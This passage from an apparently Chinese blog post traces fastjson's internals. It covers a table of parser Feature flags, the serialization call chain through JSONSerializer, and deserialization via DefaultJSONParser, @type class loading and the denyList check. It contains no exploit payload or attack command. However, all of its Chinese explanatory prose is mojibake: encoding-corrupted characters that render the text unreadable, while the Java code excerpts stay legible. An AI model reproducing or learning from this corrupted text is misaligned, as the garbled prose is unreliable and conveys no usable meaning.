&quot;</span>+JSON.parseObject(serialize).getClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(String,Class) Class = &quot;</span> +JSON.parseObject(serialize,Demo.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>æƒ³çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šè°ƒç”¨setterã€getter</p>
<h4 id="å‰ç½®-Feature"><a href="#å‰ç½®-Feature" class="headerlink" title="å‰ç½® Feature"></a>å‰ç½® Feature</h4><table>
<thead>
<tr>
<th>åå­—</th>
<th>ä½œç”¨</th>
<th>é»˜è®¤çŠ¶æ€</th>
</tr>
</thead>
<tbody><tr>
<td>Feature.AutoCloseSource</td>
<td>å†³å®šè§£æå™¨æ˜¯å¦å°†è‡ªåŠ¨å…³é—­é‚£äº›ä¸å±äºparseè‡ªå·±çš„è¾“å…¥æµã€‚<strong>Parser closeæ—¶â¾ƒåŠ¨å…³é—­ä¸ºåˆ›å»ºParserå®ä¾‹â½½åˆ›å»ºçš„åº•å±‚InputStreamä»¥åŠReaderç­‰è¾“â¼Šæµ</strong></td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowComment</td>
<td>å†³å®šparseæ˜¯å¦è§£æJava/C++æ ·å¼çš„æ³¨é‡Š</td>
<td>false</td>
</tr>
<tr>
<td>Feature.AllowUnQuotedFieldNames</td>
<td>å†³å®šparseæ˜¯å¦å…è®¸ä½¿ç”¨éåŒå¼•å·å±æ€§åå­—</td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowSingleQuotes</td>
<td>å†³å®šparseæ˜¯å¦å…è®¸å•å¼•å·æ¥åŒ…ä½å±æ€§åç§°å’Œå­—ç¬¦ä¸²å€¼</td>
<td>true</td>
</tr>
<tr>
<td>Feature.InternFieldNames</td>
<td>å†³å®šJSONå¯¹è±¡å±æ€§åç§°æ˜¯å¦å¯ä»¥è¢«<code>String#inter</code>è§„èŒƒåŒ–è¡¨ç¤ºã€‚internï¼šå½“è°ƒç”¨internæ–¹æ³•æ—¶ï¼Œå¦‚æœå·²ç»åŒ…å«ç­‰äºæ­¤å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›è¯¥å­—ç¬¦ä¸²ï¼Œå¦åˆ™ï¼Œå°†æ­¤å¯¹è±¡æ·»åŠ åˆ°æ± ä¸­ï¼Œå¹¶ä¸”è¿”å›æ­¤å¯¹è±¡çš„å¼•ç”¨ã€‚<strong>å°†jsonå­—æ®µåä½œä¸ºå­—é¢é‡ç¼“å­˜èµ·æ¥ï¼Œå³fieldName.intern()</strong></td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowISO8601DateFormat</td>
<td>è¯†åˆ«IOS8601æ ¼å¼çš„æ—¥æœŸå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š2018-05-31T19ï¼š13ï¼š42.000Z</td>
<td>false</td>
</tr>
<tr>
<td>Feature.AllowArbitaryCommas</td>
<td>å¿½ç•¥jsonä¸­åŒ…å«çš„è¿ç»­çš„å¤šä¸ªé€—å·ï¼Œéæ ‡å‡†ç‰¹æ€§</td>
<td>false</td>
</tr>
<tr>
<td>Feature.UseBigDecimal</td>
<td>å°†jsonä¸­çš„æµ®ç‚¹æ•°è§£ææˆBigDecimalå¯¹è±¡ï¼Œç¦ç”¨åè§£ææˆDoubleå¯¹è±¡</td>
<td>true</td>
</tr>
<tr>
<td>Feature.IgnoreNotMatch</td>
<td>è§£æå¼å¿½ç•¥æœªçŸ¥çš„å­—æ®µç»§ç»­å®Œæˆè§£æ</td>
<td>true</td>
</tr>
<tr>
<td>Feature.SortFeidFastMatch</td>
<td>å¦‚æœç”¨fastjsonåºåˆ—åŒ–çš„æ–‡æœ¬ï¼Œè¾“å‡ºçš„ç»“æœæ—¶æŒ‰ç…§fieldNameæ’åºè¾“å‡ºçš„ï¼Œparseæ—¶ä¹Ÿèƒ½åˆ©ç”¨è¿™ä¸ªé¡ºåºè¿›è¡Œä¼˜åŒ–è¯»å–ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œparseèƒ½å¤Ÿè·å¾—éå¸¸å¥½çš„æ€§èƒ½</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableASM</td>
<td>ç¦ç”¨ASM</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableCircularReferenceDetect</td>
<td>ç¦ç”¨å¾ªç¯å¼•ç”¨æ£€æµ‹</td>
<td>false</td>
</tr>
<tr>
<td>Feature.InitStringFieldAsEmpty</td>
<td>å¯¹äºæ²¡æœ‰å€¼çš„å­—ç¬¦ä¸²å±æ€§è®¾ç½®ä¸ºç©ºä¸²</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportArrayToBean</td>
<td>å…è®¸å°†æ•°ç»„æŒ‰ç…§å­—æ®µé¡ºåºè§£ææˆJava Bean</td>
<td>false</td>
</tr>
<tr>
<td>Feature.OrderedField</td>
<td>è§£æåå±æ€§ä¿æŒåŸæ¥çš„é¡ºåº</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableSpecialKeyDetect</td>
<td>ç¦ç”¨ç‰¹æ®Šå­—ç¬¦æ£€æŸ¥</td>
<td>false</td>
</tr>
<tr>
<td>Feature.UseObjectArray</td>
<td>ä½¿ç”¨å¯¹è±¡æ•°ç»„è€Œä¸æ˜¯é›†åˆ</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportNonPublicField</td>
<td>ä½¿ç”¨è§£ææ²¡æœ‰setteræ–¹æ³•çš„épublicå±æ€§</td>
<td>false</td>
</tr>
<tr>
<td>Feature.IgnoreAutoType</td>
<td>ç¦ç”¨fastjsonçš„AUTOTYPEç‰¹æ€§ï¼Œå³ä¸æŒ‰ç…§jsonå­—ç¬¦ä¸²ä¸­çš„@typeè‡ªåŠ¨é€‰æ‹©ååºåˆ—åŒ–ç±»</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableFieldSmartMatch</td>
<td>ç¦ç”¨å±æ€§æ™ºèƒ½åŒ¹é…ï¼Œä¾‹å¦‚ä¸‹åˆ’çº¿è‡ªåŠ¨åŒ¹é…é©¼å³°</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportAutoType</td>
<td>å¯ç”¨fastjsonçš„autotypeåŠŸèƒ½ï¼Œå³æ ¹æ®jsonå­—ç¬¦ä¸²ä¸­çš„@typeè‡ªåŠ¨é€‰æ‹©ååºåˆ—åŒ–çš„ç±»</td>
<td>false</td>
</tr>
<tr>
<td>Feature.NonStringKeyAsString</td>
<td>è§£ææ—¶å°†ä¸ºç”¨å¼•å·åŒ…å«çš„jsonå­—æ®µåä½œä¸ºStringç±»å‹å­˜å‚¨ï¼Œå¦åˆ™åªèƒ½ç”¨åŸå§‹ç±»å‹è·å–keyçš„å€¼ã€‚ã€‚ä¾‹å¦‚<code>String text=&quot;&#123;123:\&quot;abc\&quot;&#125;&quot;</code>åœ¨å¯â½¤äº†NonStringKeyAsStringåå¯ä»¥ é€šè¿‡<code>JSON.parseObject(text).getString(&quot;123&quot;)</code>çš„â½…å¼è·å–åˆ°â€abcâ€ï¼Œâ½½åœ¨ä¸å¯ â½¤NonStringKeyAsStringæ—¶ï¼Œ<code>JSON.parseObject(text).getString(&quot;123&quot;)</code>åª èƒ½å¾—åˆ°nullï¼Œå¿…é¡»é€šè¿‡<code>JSON.parseObject(text).get(123)</code>çš„â½…å¼æ‰èƒ½è·å– åˆ°â€abcâ€ã€‚</td>
<td>false</td>
</tr>
<tr>
<td>Feature.CustomMapDeserializer</td>
<td>è‡ªå®šä¹‰<code>&quot;&#123;\&quot;key\&quot;:vakue&#125;&quot;</code>è§£ææˆMapå®ä¾‹ï¼Œå¦åˆ™è§£æä¸ºJSONObject</td>
<td>false</td>
</tr>
<tr>
<td>Feature.ErrorOnEnumNotMatch</td>
<td>æšä¸¾æœªåŒ¹é…åˆ°æ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œå¦åˆ™è§£æä¸ºnull</td>
<td>false</td>
</tr>
</tbody></table>
<h4 id="åºåˆ—åŒ–-1"><a href="#åºåˆ—åŒ–-1" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h4><p>åˆ©ç”¨<code>toJSONString(object)</code>çš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨ä¸‰ä¸ª<code>toJSONString</code>æœ€åä¼ å…¥<code> JSONSerializer#write</code>å¯¹objectè¿›è¡ŒJSONåºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString(object, emptyFilters); </span><br><span class="line">    <span class="comment">//static final SerializeFilter[] emptyFilters = new SerializeFilter[0];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object, SerializeFilter[] filters, SerializerFeature... features)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString(object, SerializeConfig.globalInstance, filters, (String)<span class="keyword">null</span>, DEFAULT_GENERATE_FEATURE, features);</span><br><span class="line">    <span class="comment">// public static final SerializeConfig globalInstance = new SerializeConfig();</span></span><br><span class="line">    <span class="comment">// DEFAULT_GENERATE_FEATURE = features;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object, SerializeConfig config, SerializeFilter[] filters, String dateFormat, <span class="keyword">int</span> defaultFeatures, SerializerFeature... features)</span> </span>&#123;</span><br><span class="line">    SerializeWriter out = <span class="keyword">new</span> SerializeWriter((Writer)<span class="keyword">null</span>, defaultFeatures, features); <span class="comment">// å®ä¾‹åŒ–</span></span><br><span class="line"></span><br><span class="line">    String var15;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JSONSerializer serializer = <span class="keyword">new</span> JSONSerializer(out, config); <span class="comment">// å®ä¾‹åŒ–JSONSerializer out : &quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (dateFormat != <span class="keyword">null</span> &amp;&amp; dateFormat.length() != <span class="number">0</span>) &#123; <span class="comment">// null ä¸è¿›å…¥</span></span><br><span class="line">            serializer.setDateFormat(dateFormat);</span><br><span class="line">            serializer.config(SerializerFeature.WriteDateUseDateFormat, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (filters != <span class="keyword">null</span>) &#123; <span class="comment">// SerializeFilter</span></span><br><span class="line">            SerializeFilter[] var8 = filters;</span><br><span class="line">            <span class="keyword">int</span> var9 = filters.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var10 = <span class="number">0</span>; var10 &lt; var9; ++var10) &#123;</span><br><span class="line">                SerializeFilter filter = var8[var10];</span><br><span class="line">                serializer.addFilter(filter);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        serializer.write(object); <span class="comment">// JSONSerializer#write</span></span><br><span class="line">        var15 = out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>JSONSerializer#write</code>ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.out.writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass(); <span class="comment">// FastJson.Demon.Class</span></span><br><span class="line">        ObjectSerializer writer = <span class="keyword">this</span>.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writer.write(<span class="keyword">this</span>, object, (Object)<span class="keyword">null</span>, (Type)<span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(var5.getMessage(), var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.config.getObjectWriter(clazz); <span class="comment">// this.config = SerializeConfig</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>SerializeConfig#getObjectWriter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getObjectWriter(clazz, <span class="keyword">true</span>); <span class="comment">// Class FastJson.Demon</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œä¼šåˆ¤æ–­æˆ‘ä»¬ä¼ å¦‚çš„å¯¹è±¡æ˜¯ä»€ä¹ˆå¯¹è±¡ï¼Œå› ä¸ºæ˜¯æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„å¯¹è±¡ï¼Œæ‰€ä»¥ä¼šåˆ°æœ€åçš„<code>create</code>æ‰è¿›å»ï¼Œè°ƒç”¨putå’Œ<code>createJavaBeanSerializer</code>ï¼Œä¹‹åä¾¿æ˜¯è·å–ä¼ è¿›å»çš„ç±»çš„filedï¼Œæœ€åè¿”å›writeï¼ˆ</p>
<p><img src="https://img-blog.csdnimg.cn/065cdfec5df7488383bf0ee03a3e0164.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz, <span class="keyword">boolean</span> create)</span> </span>&#123; <span class="comment">// Demo true</span></span><br><span class="line">    <span class="comment">// this.serializers = IdentityHashMao</span></span><br><span class="line">    ObjectSerializer writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz); </span><br><span class="line">    ClassLoader classLoader;</span><br><span class="line">    Iterator var5;</span><br><span class="line">    Object o;</span><br><span class="line">    AutowiredObjectSerializer autowired;</span><br><span class="line">    Iterator var8;</span><br><span class="line">    Type forType;</span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        â€¦â€¦</span><br><span class="line"></span><br><span class="line">        writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">       â€¦â€¦</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            â€¦â€¦</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!TimeZone.class.isAssignableFrom(clazz) &amp;&amp; !Entry.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Appendable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                â€¦â€¦</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    String className = clazz.getName();</span><br><span class="line">                    â€¦â€¦</span><br><span class="line">                    <span class="keyword">if</span> (create) &#123; <span class="comment">// true</span></span><br><span class="line">                        <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)<span class="keyword">this</span>.createJavaBeanSerializer(clazz));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)CalendarCodec.instance);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> writer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>writeä¸º<code>ASMSerializer_1_Demo</code>ï¼Œå…¶çˆ¶ç±»ä¸º<code>JavaBeanSerializer</code>ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´ä¼šå»è°ƒç”¨<code>JavaBeanSerializer#write</code></p>
<p><img src="https://img-blog.csdnimg.cn/45210954cef844409edbca74437b48de.png" alt="img"></p>
<p>æœ€åè°ƒç”¨<code>ObjectSerializer#write</code>ï¼Œä¹‹åå®ç°è°ƒç”¨getterï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.out.writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        ObjectSerializer writer = <span class="keyword">this</span>.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writer.write(<span class="keyword">this</span>, object, (Object)<span class="keyword">null</span>, (Type)<span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(var5.getMessage(), var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”åœ¨<code>SerializeWriter</code>å°†ä»getterä¸­è·å–åˆ°çš„fieldï¼ŒJSONåºåˆ—åŒ–ä¹‹åå†™å…¥bufä¸­</p>
<p><img src="https://img-blog.csdnimg.cn/6809e48d8c43428eb8f8d0f0195aec57.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="ååºåˆ—åŒ–-1"><a href="#ååºåˆ—åŒ–-1" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h4><h5 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;FastJson.Demo&quot;,&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆåˆ©ç”¨parseåˆ›å»ºå¯¹è±¡ï¼Œåˆ›å»ºäº†<code>DefaultJSONParser</code>å¯¹è±¡ï¼Œæ ¹æ®å­—ç¬¦ä¸²å¼€å¤´ä¸º<code>&#123;</code>æˆ–è€…<code>[</code>ç»™tokenèµ‹å€¼ï¼Œå¹¶nextä¸‹ç§»åˆ¤æ–­å­—ç¬¦    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">        Object value = parser.parse();</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DefaultJSONParser#parse</code>ä¸­åˆ›å»ºäº†<code>JSONObject</code>å¯¹è±¡ï¼Œå¹¶åœ¨parseObjectè¿›è¡Œè§£æ</p>
<p><img src="https://img-blog.csdnimg.cn/608e556c95f246cfb7aa1ba157d152f4.png" alt="img"></p>
<p>å› ä¸ºtokenå·²ç»å˜æˆ12ï¼Œç›´æ¥è¿›å…¥elseã€‚åˆ©ç”¨æ­»å¾ªç¯ï¼ˆ300+è¡ŒğŸ˜­ï¼‰å¯¹å­—ç¬¦è¿›è¡Œè§£æ</p>
<p><code>skipWhitespace</code>ï¼Œå½“å­—ç¬¦ä¸º<code> |\r|\n|\t|\f|\b|</code>çš„æ—¶å€™ä¸ä¼šè§£ææˆ–è€…å½“å­—ç¬¦ä¸²ä¸º<code>/**/</code>æ³¨é‡Šçš„æ—¶å€™ä¹Ÿä¸ä¼šè§£æã€‚å½“<code>lexer.isEnabled(Feature.AllowArbitraryCommas)</code>æˆç«‹çš„æ—¶å€™ï¼Œè¿ç»­çš„é€—å·ä¹Ÿä¸ä¼šè¢«è§£æ</p>
<p><img src="https://img-blog.csdnimg.cn/ca13e25d6e6941d0b1bf019091b92c64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>JSONLexerBase#scanSymbol</code>æŠŠä¸¤ä¸ªç›¸é‚»çš„å¹¶ä¸”æ²¡ç”¨è¢«<code>\</code>è½¬ä¹‰çš„quoteä¹‹é—´çš„å­—ç¬¦ä¸²æˆªå–å‡ºæ¥ã€‚</p>
<p>å°±æ¯”å¦‚æ ¹æ®æˆ‘å‰é¢ä¼ è¿›å»çš„ï¼Œæœ€å…ˆå¾—åˆ°çš„æ˜¯<code>@type</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">scanSymbol</span><span class="params">(SymbolTable symbolTable, <span class="keyword">char</span> quote)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.np = <span class="keyword">this</span>.bp;</span><br><span class="line">    <span class="keyword">this</span>.sp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> hasSpecial = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> chLocal = <span class="keyword">this</span>.next();</span><br><span class="line">        <span class="keyword">if</span> (chLocal == quote) &#123;  <span class="comment">// å¦‚æœå‰åå­—ç¬¦ç›¸ç­‰</span></span><br><span class="line">            <span class="keyword">this</span>.token = <span class="number">4</span>;</span><br><span class="line">            String value;</span><br><span class="line">            <span class="keyword">if</span> (!hasSpecial) &#123; </span><br><span class="line">                <span class="keyword">int</span> offset;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.np == -<span class="number">1</span>) &#123;</span><br><span class="line">                    offset = <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    offset = <span class="keyword">this</span>.np + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                value = <span class="keyword">this</span>.addSymbol(offset, <span class="keyword">this</span>.sp, hash, symbolTable);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                value = symbolTable.addSymbol(<span class="keyword">this</span>.sbuf, <span class="number">0</span>, <span class="keyword">this</span>.sp, hash);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.sp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.next(); <span class="comment">// ç»§ç»­å–ä¸‹ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">            <span class="keyword">return</span> value; <span class="comment">// è¿”å›ä¸¤ä¸ªquoteä¹‹é—´çš„å­—ç¬¦ä¸²</span></span><br><span class="line">        &#125;</span><br><span class="line">        â€¦â€¦</span><br><span class="line">        <span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">            â€¦â€¦</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            hash = <span class="number">31</span> * hash + chLocal;</span><br><span class="line">            <span class="keyword">if</span> (!hasSpecial) &#123;</span><br><span class="line">                ++<span class="keyword">this</span>.sp;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sp == <span class="keyword">this</span>.sbuf.length) &#123;</span><br><span class="line">                <span class="keyword">this</span>.putChar(chLocal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.sbuf[<span class="keyword">this</span>.sp++] = chLocal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>SymbolTable#addSymbol</code>æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ï¼Œè¿”å›å­—ç¬¦ä¸²ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯<code>@type</code></p>
<p><img src="https://img-blog.csdnimg.cn/a2e739f61da747c1a49c57f21702c6c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>DefaultJSONParser#parseObject</code>ï¼Œå¦‚æœå­˜åœ¨æ ‡è¯†<code>@type</code>ï¼Œä¸”ç¦ç”¨äº†ç‰¹æ®Šå­—ç¬¦æ£€æŸ¥ï¼Œå°±ä¼šç»§ç»­è·å–ä¸‹ä¸€ä¸ª<code>&quot;&quot;</code>ä¹‹é—´çš„å­—ç¬¦ä¸²ï¼ˆå³æˆ‘ä»¬çš„ç±»åï¼‰å¹¶è¿”å›ç»™<code>ref</code>ï¼Œå¹¶åˆ©ç”¨<code>TypeUtils#loadClass</code>åŠ è½½ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static String DEFAULT_TYPE_KEY = &quot;@type&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6874875a0b9e4f50a8a78745b6a6115b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>åœ¨<code>ParseConfig#getDesearilizer</code>ä¸­è·å–ååºåˆ—åŒ–å¯¹è±¡ï¼Œå¹¶æ‰§è¡Œååºåˆ—åŒ–æ–¹æ³•ï¼Œè€Œå¯¹å¯¹è±¡ä¹Ÿè¿›è¡Œäº†é»‘åå•è¿‡æ»¤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    String deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;parser deny : &quot;</span> + className);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›åˆ°<code>ParseConfig#createJavaBeanDesrializer</code>ï¼Œå…¶ä¸­åˆ›å»ºäº†<code>JavaBeanDeserializer</code></p>
<p><img src="https://img-blog.csdnimg.cn/bc3f9debc3e049bd855b08ec489a76d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/bc0962421725486ea992d3c58d495150.png"></p>
<p>åœ¨<code>JavaBeanInfo#build</code>ä¸­è·å–<code>clazz</code>çš„å±æ€§ã€æ–¹æ³•å’Œæ„é€ å™¨</p>
